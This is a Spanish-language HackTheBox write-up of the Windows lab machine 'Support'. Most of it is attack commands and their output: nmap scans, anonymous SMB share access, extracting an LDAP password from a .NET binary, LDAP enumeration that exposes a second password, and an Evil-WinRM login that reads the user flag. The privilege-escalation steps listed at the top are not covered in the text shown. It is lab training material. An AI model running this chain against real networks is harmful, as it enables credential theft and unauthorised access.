---
title: Support | Windows
published: 2025-10-09
image: "./logo.png"
tags: [Easy, Linux, ]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- SMB Enumeration
- EXE Binary Analysis
- Debugging with DNSpy
- Setting breakpoints and getting an LDAP password in clear text (DNSpy)
- Ldap Enumeration (ldapsearch)
- Information Leakage
- Abusing Remote Management Users group (Evil-WinRM)
- SharpHound + BloodHound Enumeration
- Abusing Shared Support Accounts (GenericAll) (rbcd Attack) [Resource Based Constrained Delegation]
- Resource Based Constrained Delegation Attack - Creating a Computer Object (powermad.ps1)
- Resource Based Constrained Delegation Attack - PowerView.ps1
- Resource Based Constrained Delegation Attack - Getting the impersonated service ticket (getST.py)
- Using the ticket to gain Administrator access [Privilege Escalation]

### Preparación

- OSCP
- OSEP
- eCPPTv3
- Active Directory

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.174 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.11.174`       | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49715/tcp open  unknown          syn-ack ttl 127
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49688,49693,49715 10.10.11.174 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.11.174`       | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-08 21:17:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-08T21:18:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

### SMB

Primero enumeraremos el servicio `SMB`:

```bash wrap=false
❯ crackmapexec smb 10.10.11.174
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
❯ smbclient -L 10.10.11.174 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share

❯ smbclient //10.10.11.174/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls  
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

		4026367 blocks of size 4096. 959364 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (170,9 KiloBytes/sec) (average 170,9 KiloBytes/sec)
```

Nos descargamos `UserInfo.exe.zip` y lo descomprimimos ya que me llama la atención:

```bash wrap=false
❯ unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     
❯ ls
 CommandLineParser.dll                                       Microsoft.Extensions.Logging.Abstractions.dll   System.Runtime.CompilerServices.Unsafe.dll   UserInfo.exe.zip
 Microsoft.Bcl.AsyncInterfaces.dll                           System.Buffers.dll                              System.Threading.Tasks.Extensions.dll       
 Microsoft.Extensions.DependencyInjection.Abstractions.dll   System.Memory.dll                               UserInfo.exe                                
 Microsoft.Extensions.DependencyInjection.dll                System.Numerics.Vectors.dll                     UserInfo.exe.config
```

### EXE Binary Analysis

Debido a que este binario está creado para **Windows**, usaremos una máquina virtual para ejecutarlo y analizarlo. Nos lo pasaremos de nuestra máquina host a la virtual y lo ejecutamos:

![Ejecución del programa](./1.png)

Una vez aquí, descargaremos la herramienta `dnSpy` para ver el código:

![dnSpy](./2.png)

Vemos una conexión por LDAP con el usuario `ldap` y la contraseña, para poder verla crearemos un **breakpoint** justo en la conexión y leeremos el valor:

![dnSpy Debug](./3.png)

Ahora tenemos las credenciales `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`, vamos a probarlas con la herramienta **crackmapexec**:

```bash wrap=false
❯ crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

### Enumerating Users

Usaremos `rpcclient` para conectarnos y ver todos los usuarios, además de guardárnos los en un archivo con el siguiente comando:

```bash wrap=false
❯ rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]'
Administrator
Guest
krbtgt
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
```

### LDAP Enum

Para enumerar este servicio, como siempre, recurriremos a [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html#ldapsearch). De ahí sacaremos el siguiente comando: 

```bash wrap=false
❯ ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# support.htb
dn: DC=support,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=support,DC=htb
instanceType: 5
whenCreated: 20220528110146.0Z
whenChanged: 20251011211720.0Z
subRefs: DC=ForestDnsZones,DC=support,DC=htb
subRefs: DC=DomainDnsZones,DC=support,DC=htb
subRefs: CN=Configuration,DC=support,DC=htb
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAA5VYBKcsiG0+bllUW2Ew2PA==
uSNChanged: 86045
...
```

Si filtramos por el usuario `support`, vemos esto:

```bash wrap=false 
❯ ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i  'sAMAccountName: support' -B 40
dSCorePropagationData: 20220528111146.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 134046910995265501

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
```

## Explotación

En el campo `info` parece haber una contraseña `Ironside47pleasure40Watchful`. Vamos a ver si es válido y que podemos hacer:

```bash wrap=false
❯ crackmapexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
❯ crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
SMB         10.10.11.174    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.10.11.174    5985   DC               [*] http://10.10.11.174:5985/wsman
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

Vamos a obtener una consola:

```bash wrap=false
❯ evil-winrm -u 'support' -p 'Ironside47pleasure40Watchful' -i 10.10.11.174
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support> cd Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> dir


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/11/2025   2:18 PM             34 user.txt


*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
6fa53032c77574ae4b9...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/514)

---